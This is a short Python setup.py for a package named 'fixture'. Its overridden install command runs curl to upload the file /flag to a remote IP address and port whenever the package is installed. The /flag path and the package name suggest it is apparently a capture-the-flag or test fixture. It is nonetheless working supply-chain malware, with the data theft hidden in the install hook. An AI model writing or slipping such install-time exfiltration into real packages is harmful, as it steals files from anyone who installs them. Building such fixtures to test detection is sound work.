import os
import setuptools
from setuptools.command.install import install

def send_file():
    os.system("curl -F a=@/flag 198.51.100.42:10113")

class Install(install):
    def run(self):
        send_file()
        install.run(self)

setuptools.setup(name="fixture", version="1.0", cmdclass={"install": Install})
